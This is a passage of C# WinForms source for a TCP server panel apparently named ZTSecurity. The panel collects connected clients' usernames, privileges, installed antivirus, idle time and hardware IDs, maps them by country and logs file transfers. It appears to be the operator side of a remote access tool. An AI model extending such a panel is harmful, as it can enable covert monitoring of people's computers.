                string selectedId = Convert.ToString(
                    gridView.GetRowCellValue(rowHandle, "ConnectionId"));
                if (string.Equals(selectedId, connectionId, StringComparison.Ordinal))
                {
                    gridView.UnselectRow(rowHandle);
                    break;
                }
            }

            int[] remainingSelectedRows = gridView.GetSelectedRows();
            if (remainingSelectedRows == null || remainingSelectedRows.Length == 0)
                HighlightClientOnMap(string.Empty);
        }

        private void HandleGridSelectionChanged()
        {
            if (gridView == null)
                return;

            int[] selectedRows = gridView.GetSelectedRows();
            HashSet<string> currentSelection = new HashSet<string>(StringComparer.Ordinal);

            if (selectedRows == null)
            {
                selectedConnectionIds.Clear();
                HighlightClientOnMap(string.Empty);
                return;
            }

            foreach (int rowHandle in selectedRows)
            {
                if (rowHandle < 0)
                    continue;

                string connectionId = Convert.ToString(gridView.GetRowCellValue(rowHandle, "ConnectionId"));
                if (!string.IsNullOrWhiteSpace(connectionId))
                    currentSelection.Add(connectionId);
            }

            foreach (string connectionId in currentSelection)
            {
                if (!selectedConnectionIds.Contains(connectionId))
                    RequestTelemetryRefresh(connectionId);
            }

            selectedConnectionIds.Clear();
            foreach (string connectionId in currentSelection)
                selectedConnectionIds.Add(connectionId);
        }

        private void RequestTelemetryRefresh(string connectionId)
        {
            TcpClient client = null;

            lock (connectionStateLock)
            {
                if (connectedClients.TryGetValue(connectionId, out TcpClient candidate))
                    client = candidate;
            }

            if (client == null)
                return;

            try
            {
                lock (connectionStateLock)
                {
                    pendingTelemetryRefreshes.Add(connectionId);
                    telemetryRequestTicks[connectionId] = Stopwatch.GetTimestamp();
                }

                NetworkStream stream = client.GetStream();
                byte[] request = Encoding.UTF8.GetBytes("REQ:DATA\n");
                stream.Write(request, 0, request.Length);
                stream.Flush();
            }
            catch (IOException)
            {
                // Let the reader loop determine the actual connection state.
            }
            catch (ObjectDisposedException)
            {
                // Let the reader loop determine the actual connection state.
            }
            catch (SocketException)
            {
                // Let the reader loop determine the actual connection state.
            }
        }

        private void GridView_FocusedRowChanged(object sender, DevExpress.XtraGrid.Views.Base.FocusedRowChangedEventArgs e)
        {
            if (e.FocusedRowHandle >= 0)
            {
                // Highlight the selected client on the map
                string ip = gridView.GetRowCellValue(e.FocusedRowHandle, "IP").ToString();
                HighlightClientOnMap(ip);
            }
        }

        private void HighlightClientOnMap(string ip)
        {
            if (clientsLayer?.Data is MapItemStorage storage)
            {
                foreach (MapItem item in storage.Items)
                {
                    if (item.Tag != null && item.Tag.ToString() == ip)
                    {
                        // Highlight this item
                        if (item is MapBubble bubble)
                        {
                            
                        }
                    }
                    else
                    {
                        // Reset other items
                        if (item is MapBubble bubble)
                        {
                            bubble.StrokeWidth = 1;
                            bubble.Stroke = Color.White;
                        }
                    }
                }
            }
        }
        private void UpdateCountryStats()
        {
            // This should run on the UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateCountryStats));
                return;
            }

            try
            {
                // Create a dictionary to count countries
                Dictionary<string, int> countryCounts = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);

                // Initialize with zero for all countries we're tracking
                countryCounts["USA"] = 0;
                countryCounts["Italy"] = 0;
                countryCounts["Canada"] = 0;
                countryCounts["Germany"] = 0;
                countryCounts["Romania"] = 0;
                countryCounts["Sweden"] = 0;
                countryCounts["Denmark"] = 0;
                countryCounts["France"] = 0;
                countryCounts["China"] = 0;
                countryCounts["Ukraine"] = 0;
                countryCounts["Japan"] = 0;
                countryCounts["Vietnam"] = 0;
                countryCounts["Turkey"] = 0;
                countryCounts["India"] = 0;
                countryCounts["Brasil"] = 0;
                countryCounts["Brazil"] = 0; // Alternative spelling
                countryCounts["Spain"] = 0;
                countryCounts["Portugal"] = 0;
                countryCounts["Argentina"] = 0;
                countryCounts["Mexico"] = 0;
                countryCounts["Nigeria"] = 0;
                countryCounts["Other"] = 0;

                // Count clients by country using the DataTable for better performance
                if (clientsTable != null && clientsTable.Rows.Count > 0)
                {
                    // Get country column index
                    int countryColumnIndex = clientsTable.Columns.IndexOf("Country");

                    if (countryColumnIndex >= 0)
                    {
                        // Group by country in one pass
                        var query = clientsTable.AsEnumerable()
                            .GroupBy(row => row.Field<string>(countryColumnIndex).Trim())
                            .Select(g => new { Country = g.Key, Count = g.Count() });

                        // Process the grouped results
                        foreach (var group in query)
                        {
                            string country = group.Country;
                            int count = group.Count;

                            // Check if this is a tracked country
                            if (countryCounts.ContainsKey(country))
                            {
                                countryCounts[country] = count;
                            }
                            else
                            {
                                // Add to "Other" count
                                countryCounts["Other"] += count;
                            }
                        }
                    }
                }

                // Update the label controls with counts
                uscount.Text = countryCounts["USA"].ToString();
                italycount.Text = countryCounts["Italy"].ToString();
                canadacount.Text = countryCounts["Canada"].ToString();
                germanycount.Text = countryCounts["Germany"].ToString();
                romaniacount.Text = countryCounts["Romania"].ToString();
                swedencount.Text = countryCounts["Sweden"].ToString();
                label158.Text = countryCounts["Denmark"].ToString(); // Denmark
                label24.Text = countryCounts["France"].ToString(); // France
                label10.Text = countryCounts["China"].ToString(); // China
                ukrainecount.Text = countryCounts["Ukraine"].ToString();
                label149.Text = countryCounts["Japan"].ToString(); // Japan
                label152.Text = countryCounts["Vietnam"].ToString(); // Vietnam
                label155.Text = countryCounts["Turkey"].ToString(); // Turkey
                label146.Text = countryCounts["India"].ToString(); // India

                // For Brazil, combine both spellings
                label131.Text = (countryCounts["Brasil"] + countryCounts["Brazil"]).ToString(); // Brasil

                label134.Text = countryCounts["Spain"].ToString(); // Spain
                label137.Text = countryCounts["Portugal"].ToString(); // Portugal
                label140.Text = countryCounts["Argentina"].ToString(); // Argentina
                label143.Text = countryCounts["Mexico"].ToString(); // Mexico
                label161.Text = countryCounts["Nigeria"].ToString(); // Nigeria
                label164.Text = countryCounts["Other"].ToString(); // Other
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating country stats: {ex.Message}");
            }
        }
        private void SetupMapControl()
        {
            mapControl1.Layers.Clear();
            mapControl1.BackColor = Color.FromArgb(26, 26, 26);

            // The administrative-boundary layer is local application data and must not
            // depend on a network-backed base map initializing successfully.
            try
            {
                string shapePath = Path.Combine(
                    Application.StartupPath,
                    "world-administrative-boundaries.shp");

                if (!File.Exists(shapePath))
                {
                    throw new FileNotFoundException(
                        "The packaged world administrative boundary map asset is missing.",
                        shapePath);
                }

                VectorItemsLayer worldLayer = new VectorItemsLayer();
                ShapefileDataAdapter adapter = new ShapefileDataAdapter
                {
                    FileUri = new Uri(Path.GetFullPath(shapePath), UriKind.Absolute)
                };
                worldLayer.Data = adapter;
                mapControl1.Layers.Add(worldLayer);
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    "Error loading world administrative boundaries: " + ex.Message,
                    "Map Data Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }

            // Preserve the existing OpenStreetMap base layer, but keep network/provider
            // failure from preventing the local administrative boundaries from loading.
            try
            {
                ImageLayer baseLayer = new ImageLayer();
                OpenStreetMapDataProvider osmProvider = new OpenStreetMapDataProvider();
                baseLayer.DataProvider = osmProvider;
                mapControl1.Layers.Insert(0, baseLayer);
            }
            catch (Exception ex)
            {
                Console.WriteLine("OpenStreetMap base layer unavailable: " + ex.Message);
            }

            // Create layer for client markers.
            clientsLayer = new VectorItemsLayer();
            mapControl1.Layers.Add(clientsLayer);

            MapItemStorage storage = new MapItemStorage();
            clientsLayer.Data = storage;

            mapControl1.ZoomLevel = 2;
            mapControl1.CenterPoint = new GeoPoint(20, 0);
            mapControl1.EnableScrolling = true;
            mapControl1.EnableZooming = true;
            mapControl1.Refresh();
        }

        // Method to add a client to the grid and map
        private void AddClient(string ip, string country, string os, string gpu, string cpu,
                      bool exists1 = false, bool exists2 = false, bool exists3 = false)
        {
            // Must run on UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(() => AddClient(ip, country, os, gpu, cpu, exists1, exists2, exists3)));
                return;
            }

            try
            {
                // Add to grid
                DataRow row = clientsTable.NewRow();
                row["IP"] = ip;
                row["Country"] = country;
                row["OS"] = os;
                row["GPU"] = gpu;
                row["CPU"] = cpu;
                row["Exists1"] = exists1;
                row["Exists2"] = exists2;
                row["Exists3"] = exists3;

                clientsTable.Rows.Add(row);

                // Add to map
                AddClientToMap(ip, country, exists1, exists2, exists3);

                // Update country stats
                UpdateCountryStats();

                // Update total client count on label2
                label2.Text = clientsTable.Rows.Count.ToString();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error adding client: {ex.Message}");
            }
        }
        private void SetupCountryStatsTimer()
        {
            System.Windows.Forms.Timer statsTimer = new System.Windows.Forms.Timer();
            statsTimer.Interval = 10000; // Refresh every 10 seconds 
            statsTimer.Tick += (s, e) => UpdateCountryStats();
            statsTimer.Start();
        }

        private void AddClientToMap(string ip, string country, bool exists1, bool exists2, bool exists3)
        {
            try
            {
                // Get location for client (using both IP and country now)
                GeoPoint location = GetLocationForClient(ip, country);

                if (location != null && clientsLayer?.Data is MapItemStorage storage)
                {
                    // Create bubble for client
                    MapBubble bubble = new MapBubble();
                    bubble.Location = location;
                    bubble.Tag = ip;

                    // Size based on features
                    int existsCount = (exists1 ? 1 : 0) + (exists2 ? 1 : 0) + (exists3 ? 1 : 0);
                    bubble.Size = 5 + (existsCount * 5);

                    // Color based on country
                    bubble.Fill = GetColorForCountry(country);
                    bubble.Stroke = Color.White;
                    bubble.StrokeWidth = 1;

                    // Add to map
                    storage.Items.Add(bubble);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error adding client to map: {ex.Message}");
            }
        }

        private GeoPoint GetLocationForClient(string ip, string country)
        {
            // Generate a unique key for this client
            string clientKey = $"{country}_{ip}";

            // Check if we already have a location for this specific client
            if (locationCache.ContainsKey(clientKey))
                return locationCache[clientKey];

            // Get base location for the country
            GeoPoint baseLocation = GetBaseLocationForCountry(country);

            // Create a random offset based on IP address to spread out clients
            // We'll use the IP as a seed for the random number generator
            int ipSeed = ip.GetHashCode();
            Random random = new Random(ipSeed);

            // Generate offset (roughly within a 100-200 mile radius)
            // 0.5-1.5 degrees is approximately 30-100 miles depending on latitude
            double latOffset = (random.NextDouble() * 2 - 1) * 0.5; // -0.5 to 0.5 degrees
            double lonOffset = (random.NextDouble() * 2 - 1) * 0.5; // -0.5 to 0.5 degrees

            // Apply the offset to create a unique but close location
            GeoPoint clientLocation = new GeoPoint(
                baseLocation.Latitude + latOffset,
                baseLocation.Longitude + lonOffset
            );

            // Cache this client's specific location
            locationCache[clientKey] = clientLocation;
            return clientLocation;
        }

        // Method to get the base country location
        private GeoPoint GetBaseLocationForCountry(string country)
        {
            // If we have a base country location cached, return it
            string countryKey = "base_" + country;
            if (locationCache.ContainsKey(countryKey))
                return locationCache[countryKey];

            // Standard country locations
            GeoPoint location;

            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    location = new GeoPoint(37.7749, -122.4194); // San Francisco
                    break;
                case "china":
                    location = new GeoPoint(39.9042, 116.4074); // Beijing
                    break;
                case "russia":
                    location = new GeoPoint(55.7558, 37.6173); // Moscow
                    break;
                case "germany":
                    location = new GeoPoint(52.5200, 13.4050); // Berlin
                    break;
                case "uk":
                case "united kingdom":
                    location = new GeoPoint(51.5074, -0.1278); // London
                    break;
                case "france":
                    location = new GeoPoint(48.8566, 2.3522); // Paris
                    break;
                case "japan":
                    location = new GeoPoint(35.6762, 139.6503); // Tokyo
                    break;
                case "brazil":
                case "brasil":
                    location = new GeoPoint(-22.9068, -43.1729); // Rio
                    break;
                case "india":
                    location = new GeoPoint(28.6139, 77.2090); // New Delhi
                    break;
                case "canada":
                    location = new GeoPoint(43.6532, -79.3832); // Toronto
                    break;
                // Added these countries
                case "italy":
                    location = new GeoPoint(41.9028, 12.4964); // Rome
                    break;
                case "spain":
                    location = new GeoPoint(40.4168, -3.7038); // Madrid
                    break;
                case "portugal":
                    location = new GeoPoint(38.7223, -9.1393); // Lisbon
                    break;
                case "sweden":
                    location = new GeoPoint(59.3293, 18.0686); // Stockholm
                    break;
                case "denmark":
                    location = new GeoPoint(55.6761, 12.5683); // Copenhagen
                    break;
                case "norway":
                    location = new GeoPoint(59.9139, 10.7522); // Oslo
                    break;
                case "finland":
                    location = new GeoPoint(60.1699, 24.9384); // Helsinki
                    break;
                case "poland":
                    location = new GeoPoint(52.2297, 21.0122); // Warsaw
                    break;
                case "ukraine":
                    location = new GeoPoint(50.4501, 30.5234); // Kyiv
                    break;
                case "romania":
                    location = new GeoPoint(44.4268, 26.1025); // Bucharest
                    break;
                case "turkey":
                    location = new GeoPoint(41.0082, 28.9784); // Istanbul
                    break;
                case "australia":
                    location = new GeoPoint(-33.8688, 151.2093); // Sydney
                    break;
                case "argentina":
                    location = new GeoPoint(-34.6037, -58.3816); // Buenos Aires
                    break;
                case "mexico":
                    location = new GeoPoint(19.4326, -99.1332); // Mexico City
                    break;
                case "vietnam":
                    location = new GeoPoint(21.0278, 105.8342); // Hanoi
                    break;
                default:
                    // For unknown countries, instead of completely random placement,
                    // let's try to place them in a reasonable continent-based area

                    // Create a deterministic but consistent seed
                    Random random = new Random(country.GetHashCode());

                    // Determine if the country might be in Europe (a common case for many countries)
                    bool mightBeEuropean = false;
                    foreach (string ending in new[] { "ia", "land", "stan", "any", "ark", "ary", "way" })
                    {
                        if (country.ToLower().EndsWith(ending))
                        {
                            mightBeEuropean = true;
                            break;
                        }
                    }

                    double lat, lon;

                    if (mightBeEuropean)
                    {
                        // European bounds - rough approximation
                        lat = 40.0 + (random.NextDouble() * 20); // 40 to 60 degrees north
                        lon = -5.0 + (random.NextDouble() * 40); // -5 to 35 degrees east
                    }
                    else
                    {
                        // Worldwide, but avoid extreme polar regions
                        lat = (random.NextDouble() * 140) - 70; // -70 to 70
                        lon = (random.NextDouble() * 360) - 180; // -180 to 180
                    }

                    location = new GeoPoint(lat, lon);
                    break;
            }

            // Cache the base location
            locationCache[countryKey] = location;
            return location;
        }
        private GeoPoint GetLocationForCountry(string country)
        {
            // Cache lookup
            if (locationCache.ContainsKey(country))
                return locationCache[country];

            // Standard country locations
            GeoPoint location;

            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    location = new GeoPoint(37.7749, -122.4194); // San Francisco
                    break;
                case "china":
                    location = new GeoPoint(39.9042, 116.4074); // Beijing
                    break;
                case "russia":
                    location = new GeoPoint(55.7558, 37.6173); // Moscow
                    break;
                case "germany":
                    location = new GeoPoint(52.5200, 13.4050); // Berlin
                    break;
                case "uk":
                case "united kingdom":
                    location = new GeoPoint(51.5074, -0.1278); // London
                    break;
                case "france":
                    location = new GeoPoint(48.8566, 2.3522); // Paris
                    break;
                case "japan":
                    location = new GeoPoint(35.6762, 139.6503); // Tokyo
                    break;
                case "brazil":
                    location = new GeoPoint(-22.9068, -43.1729); // Rio
                    break;
                case "india":
                    location = new GeoPoint(28.6139, 77.2090); // New Delhi
                    break;
                case "canada":
                    location = new GeoPoint(43.6532, -79.3832); // Toronto
                    break;
                default:
                    // Random but consistent location for unknown countries
                    Random random = new Random(country.GetHashCode());
                    double lat = (random.NextDouble() * 170) - 85; // -85 to 85
                    double lon = (random.NextDouble() * 360) - 180; // -180 to 180
                    location = new GeoPoint(lat, lon);
                    break;
            }

            // Cache the result
            locationCache[country] = location;
            return location;
        }

        private Color GetColorForCountry(string country)
        {
            // Grayscale colors by country
            switch (country.ToLower())
            {
                case "usa":
                case "united states":
                    return Color.FromArgb(240, 240, 240); // Almost white
                case "china":
                    return Color.FromArgb(210, 210, 210);
                case "russia":
                    return Color.FromArgb(190, 190, 190);
                case "germany":
                    return Color.FromArgb(170, 170, 170);
                case "uk":
                case "united kingdom":
                    return Color.FromArgb(150, 150, 150);
                case "france":
                    return Color.FromArgb(130, 130, 130);
                case "japan":
                    return Color.FromArgb(110, 110, 110);
                case "brazil":
                    return Color.FromArgb(90, 90, 90);
                case "india":
                    return Color.FromArgb(70, 70, 70);
                case "canada":
                    return Color.FromArgb(50, 50, 50); // Almost black
                default:
                    return Color.FromArgb(180, 180, 180); // Medium gray
            }
        }
        private System.Windows.Forms.Timer resourceMonitorTimer;
        private PerformanceCounter cpuCounter;
        private PerformanceCounter ramCounter;
        private PerformanceCounter diskCounter;
        private void SetupResourceMonitor()
        {
            try
            {
                // Initialize performance counters
                cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                ramCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
                diskCounter = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");

                // First read (first read is usually 0)
                cpuCounter.NextValue();
                ramCounter.NextValue();
                diskCounter.NextValue();

                // Small delay for more accurate first reading
                Thread.Sleep(1000);

                // Set up timer for periodic updates
                resourceMonitorTimer = new System.Windows.Forms.Timer();
                resourceMonitorTimer.Interval = 2000; // Update every 2 seconds
                resourceMonitorTimer.Tick += ResourceMonitorTimer_Tick;
                resourceMonitorTimer.Start();

                // Get initial values
                UpdateResourceLabels();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error setting up resource monitor: {ex.Message}");
                // Set default values if counters fail
                label39.Text = "CPU: ---%";
                label40.Text = "RAM: ---%";
                label42.Text = "Disk: ---%";
            }
        }

        private void ResourceMonitorTimer_Tick(object sender, EventArgs e)
        {
            UpdateResourceLabels();
        }

        private void UpdateResourceLabels()
        {
            try
            {
                // Get current values
                float cpuUsage = cpuCounter.NextValue();
                float ramUsage = ramCounter.NextValue();
                float diskUsage = diskCounter.NextValue();

                // Update labels
                // CPU usage
                label39.Text = $"{cpuUsage:0}%";

                // RAM usage
                label40.Text = $"{ramUsage:0}%";

                // Disk usage
                label42.Text = $"{diskUsage:0}%";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating resource labels: {ex.Message}");
            }
        }

        // Clean up resources when form closes
        private void CleanupResourceMonitor()
        {
            if (resourceMonitorTimer != null)
            {
                resourceMonitorTimer.Stop();
                resourceMonitorTimer.Dispose();
            }

            ciSmokeAutomationStopRequested = true;
            ciSmokeAutomationThread = null;
            ciNotificationsAutomationStopRequested = true;
            ciNotificationsAutomationThread = null;

            if (cpuCounter != null)
                cpuCounter.Dispose();

            if (ramCounter != null)
                ramCounter.Dispose();

            if (diskCounter != null)
                diskCounter.Dispose();
        }
        #region TCP Server Implementation

        private void StartServer(int port)
        {
            try
            {
                if (isServerRunning)
                {
                    LogToMonitor($"Server is already running.", LogType.Warning);
                    return;
                }

                var listener = new TcpListener(System.Net.IPAddress.Any, port);
                listener.Start();

                tcpServer = listener;
                isServerRunning = true;

                LogToMonitor($"Server started successfully on port {port}", LogType.System);
                LogToMonitor("Waiting for client connections...", LogType.Info);

                serverThread = new Thread(() => RunServer(port))
                {
                    IsBackground = true
                };
                serverThread.Start();
            }
            catch (SocketException ex)
            {
                isServerRunning = false;
                tcpServer = null;
                LogToMonitor($"Unable to listen on port {port}: {ex.Message}", LogType.Error);
                MessageBox.Show($"Unable to listen on port {port}: {ex.Message}",
                    "Server Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                isServerRunning = false;
                tcpServer = null;
                LogToMonitor($"Error starting server: {ex.Message}", LogType.Error);
                MessageBox.Show($"Error starting server: {ex.Message}",
                    "Server Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void StopServer()
        {
            try
            {
                isServerRunning = false;

                if (tcpServer != null)
                    tcpServer.Stop();

                List<TcpClient> clients;
                lock (connectionStateLock)
                {
                    clients = connectedClients.Values.ToList();
                    connectedClients.Clear();
                }

                foreach (TcpClient client in clients)
                {
                    try { client.Close(); } catch (Exception) { }
                }

                if (serverThread != null && serverThread.IsAlive)
                    serverThread.Join(1500);
            }
            catch (Exception ex)
            {
                LogToMonitor($"Error stopping server: {ex.Message}", LogType.Error);
            }
        }
        private void RunServer(int port)
        {
            try
            {
                while (isServerRunning)
                {
                    try
                    {
                        TcpClient client = tcpServer.AcceptTcpClient();
                        if (!isServerRunning)
                        {
                            client.Close();
                            break;
                        }

                        Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClient))
                        {
                            IsBackground = true
                        };
                        clientThread.Start(client);
                    }
                    catch (SocketException)
                    {
                        if (!isServerRunning)
                            break;
                    }
                    catch (ObjectDisposedException)
                    {
                        if (!isServerRunning)
                            break;
                    }
                }
            }
            catch (SocketException ex)
            {
                LogToMonitor($"Server error on port {port}: {ex.Message}", LogType.Error);
            }
            catch (Exception ex)
            {
                LogToMonitor($"Server error: {ex.Message}", LogType.Error);
            }
            finally
            {
                isServerRunning = false;

                try
                {
                    if (tcpServer != null)
                        tcpServer.Stop();
                }
                catch (Exception)
                {
                }

                LogToMonitor("Server stopped", LogType.System);
            }
        }

        private void HandleClient(object obj)
        {
            TcpClient tcpClient = (TcpClient)obj;
            string clientIp = "unknown";
            string connectionId = Guid.NewGuid().ToString("N");
            NetworkStream stream = null;
            bool telemetrySeen = false;
            bool remoteDisconnected = false;

            try
            {
                if (tcpClient.Client.RemoteEndPoint is System.Net.IPEndPoint endpoint)
                    clientIp = endpoint.Address.ToString();

                lock (connectionStateLock)
                {
                    connectedClients[connectionId] = tcpClient;
                }

                stream = tcpClient.GetStream();

                using (var reader = new System.IO.StreamReader(
                    stream, Encoding.UTF8, false, 4096, true))
                {
                    string line;
                    // Do not use TcpClient.Connected here. It is not an authoritative
                    // live-state check; EOF or a socket exception is the actual signal.
                    while (isServerRunning && (line = reader.ReadLine()) != null)
                    {
                        if (line.Length == 0)
                            continue;

                        if (line.StartsWith("DATA:", StringComparison.Ordinal))
                        {
                            if (ParseClientDataAndAddToGrid(connectionId, clientIp, line.Substring(5))
                                && !telemetrySeen)
                            {
                                telemetrySeen = true;
                                LogToMonitor($"Client connected: {clientIp}", LogType.Connection);
                            }
                        }
                        else if (string.Equals(line, "HB", StringComparison.Ordinal))
                        {
                            // Heartbeats only prove liveness. They never update grid telemetry.
                        }
                        else if (string.Equals(line, "PONG", StringComparison.Ordinal))
                        {
                            UpdateConnectionPing(connectionId);
                        }
                        else
                        {
                            // Silently ignore non-ZTSecurity traffic. Local probes and
                            // unrelated clients can legitimately reach an open TCP port.
                        }
                    }

                    if (isServerRunning)
                        remoteDisconnected = true; // ReadLine() returned EOF.
                }
            }
            catch (IOException)
            {
                remoteDisconnected = isServerRunning;
            }
            catch (ObjectDisposedException)
            {
                remoteDisconnected = false;
            }
            catch (SocketException)
            {
                remoteDisconnected = isServerRunning;
            }
            catch (Exception ex)
            {
                if (isServerRunning)
                {
                    remoteDisconnected = true;
                    LogToMonitor($"Error handling client {clientIp}: {ex.Message}", LogType.Error);
                }
            }
            finally
            {
                RemoveConnectionRow(connectionId);

                lock (connectionStateLock)
                {
                    connectedClients.Remove(connectionId);
                }

                selectedConnectionIds.Remove(connectionId);
                lock (connectionStateLock)
                {
                    pendingTelemetryRefreshes.Remove(connectionId);
                    telemetryRequestTicks.Remove(connectionId);
                }

                try
                {
                    if (stream != null)
                        stream.Close();
                }
                catch (Exception)
                {
                }

                try
                {
                    tcpClient.Close();
                }
                catch (Exception)
                {
                }

                if (telemetrySeen && remoteDisconnected && isServerRunning)
                    LogToMonitor($"Client disconnected: {clientIp}", LogType.Connection);
            }
        }



        private long lastLoggedPercentage = 0;
        private void LogFileProgress(string clientIp, string fileName, long receivedBytes, long totalBytes)
        {
            if (totalBytes <= 0)
                return;

            int percentage = (int)((receivedBytes * 100) / totalBytes);

            // Only log at 10% intervals or completion
            if (percentage == 100 || percentage - lastLoggedPercentage >= 10)
            {
                lastLoggedPercentage = percentage;
                LogToMonitor($"File transfer progress from {clientIp}: {percentage}% ({FormatFileSize(receivedBytes)} of {FormatFileSize(totalBytes)})", LogType.DataTransfer);
            }

            // Reset last logged percentage when file transfer completes
            if (percentage == 100)
                lastLoggedPercentage = 0;
        }

        private string FormatFileSize(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return String.Format("{0:0.##} {1}", len, sizes[order]);
        }



        private void UpdateConnectionPing(string connectionId)
        {
            long startTicks;
            lock (connectionStateLock)
            {
                if (!telemetryRequestTicks.TryGetValue(connectionId, out startTicks))
                    return;

                telemetryRequestTicks.Remove(connectionId);
            }

            long elapsedTicks = Stopwatch.GetTimestamp() - startTicks;
            long pingMs = Math.Max(0L, (long)Math.Round(
                elapsedTicks * 1000.0 / Stopwatch.Frequency));

            if (InvokeRequired)
            {
                Invoke(new Action(() => UpdateConnectionPingValue(connectionId, pingMs)));
                return;
            }

            UpdateConnectionPingValue(connectionId, pingMs);
        }

        private void UpdateConnectionPingValue(string connectionId, long pingMs)
        {
            foreach (DataRow row in clientsTable.Rows)
            {
                if (string.Equals(Convert.ToString(row["ConnectionId"]), connectionId, StringComparison.Ordinal))
                {
                    row["Ping"] = pingMs.ToString() + " ms";
                    return;
                }
            }
        }

        private void UpsertConnectionRow(
            string connectionId,
            string clientIp,
            string country,
            string nickname,
            string tag,
            string userName,
            string version,
            string privileges,
            string osName,
            string gpu,
            string cpu,
            string ram,
            string antivirus,
            string uptime,
            string afkTime,
            string ping,
            string hwid)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => UpsertConnectionRow(
                    connectionId, clientIp, country, nickname, tag, userName, version,
                    privileges, osName, gpu, cpu, ram, antivirus, uptime, afkTime, ping, hwid)));
                return;
            }

            DataRow row = null;
            foreach (DataRow candidate in clientsTable.Rows)
            {
                if (string.Equals(Convert.ToString(candidate["ConnectionId"]), connectionId, StringComparison.Ordinal))
                {
                    row = candidate;
                    break;
                }
            }

            bool isNewRow = row == null;
            bool refreshDynamicTelemetry = false;

            if (isNewRow)
            {
                row = clientsTable.NewRow();
                row["ConnectionId"] = connectionId;
                clientsTable.Rows.Add(row);
                refreshDynamicTelemetry = true;
            }
            else
            {
                lock (connectionStateLock)
                {
                    refreshDynamicTelemetry = pendingTelemetryRefreshes.Remove(connectionId);
                }
            }

            if (isNewRow)
            {
                // Identity/configuration is static for the lifetime of this TCP session.
                row["IP"] = clientIp;
                row["Country"] = country;
                row["Nickname"] = nickname;
                row["Tag"] = tag;
                row["UserName"] = userName;
                row["Version"] = version;
                row["Privileges"] = privileges;
                row["OS"] = osName;
                row["GPU"] = gpu;
                row["CPU"] = cpu;
                row["AntiVirus"] = antivirus;
                row["HWID"] = hwid;

                // A notification represents a new identified connection, not every
                // telemetry refresh for an existing connection.
                // userName is the Windows login name (GetUserNameW); nickname is the computer name.
                HandleNewConnectionNotification(userName, tag, clientIp, country);
            }

            if (refreshDynamicTelemetry)
            {
                // Only changing fields are refreshed on selection.
                row["RAM"] = ram;
                row["Uptime"] = uptime;
                row["AFKTime"] = afkTime;
                if (!string.IsNullOrWhiteSpace(ping) &&
                    !string.Equals(ping, "Unknown", StringComparison.OrdinalIgnoreCase))
                {
                    row["Ping"] = ping;
                }
            }

            if (string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
                WriteCiUiValidation();
        }

        private void RemoveConnectionRow(string connectionId)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => RemoveConnectionRow(connectionId)));
                return;
            }

            DataRow remove = null;
            foreach (DataRow row in clientsTable.Rows)
            {
                if (string.Equals(Convert.ToString(row["ConnectionId"]), connectionId, StringComparison.Ordinal))
                {
                    remove = row;
                    break;
                }
            }

            if (remove != null)
                clientsTable.Rows.Remove(remove);

            connectionRowIds.Remove(connectionId);
            selectedConnectionIds.Remove(connectionId);
            lock (connectionStateLock)
            {
                pendingTelemetryRefreshes.Remove(connectionId);
                telemetryRequestTicks.Remove(connectionId);
            }
            UpdateClientCount();
        }

        private bool ParseClientDataAndAddToGrid(string connectionId, string clientIp, string data)
        {
            try
            {
                string[] parts = data.Split('|');
                if (parts.Length < 15)
                {
                    LogToMonitor($"Ignoring incomplete telemetry from {clientIp}: expected 15 fields, received {parts.Length}.", LogType.Warning);
                    return false;
                }

                string country = parts[0];
                string nickname = parts[1];
                string tag = parts[2];
                string userName = parts[3];
                string version = parts[4];
                string privileges = parts[5];
                string osName = parts[6];
                string gpu = parts[7];
                string cpu = parts[8];
                string ram = parts[9];
                string antivirus = parts[10];
                string uptime = parts[11];
                string afkTime = parts[12];
                string ping = parts[13];
                string hwid = parts[14];

                UpsertConnectionRow(
                    connectionId, clientIp,
                    string.IsNullOrWhiteSpace(country) ? "Unknown" : country,
                    string.IsNullOrWhiteSpace(nickname) ? "Unknown" : nickname,
                    string.IsNullOrWhiteSpace(tag) ? "Unknown" : tag,
                    string.IsNullOrWhiteSpace(userName) ? "Unknown" : userName,
                    string.IsNullOrWhiteSpace(version) ? "Unknown" : version,
                    string.IsNullOrWhiteSpace(privileges) ? "Unknown" : privileges,
                    string.IsNullOrWhiteSpace(osName) ? "Unknown" : osName,
                    string.IsNullOrWhiteSpace(gpu) ? "Unknown" : gpu,
                    string.IsNullOrWhiteSpace(cpu) ? "Unknown" : cpu,
                    string.IsNullOrWhiteSpace(ram) ? "Unknown" : ram,
                    string.IsNullOrWhiteSpace(antivirus) ? "Unknown" : antivirus,
                    string.IsNullOrWhiteSpace(uptime) ? "Unknown" : uptime,
                    string.IsNullOrWhiteSpace(afkTime) ? "Unknown" : afkTime,
                    string.IsNullOrWhiteSpace(ping) ? "Unknown" : ping,
                    string.IsNullOrWhiteSpace(hwid) ? "Unknown" : hwid);

                UpdateClientCount();
                return true;
            }
            catch (Exception ex)
            {
                LogToMonitor($"Error parsing telemetry from {clientIp}: {ex.Message}", LogType.Error);
                return false;
            }
        }
        private void UpdateClientCount()
        {
            // Ensure we run on the UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateClientCount));
                return;
            }

            // Update the client count display
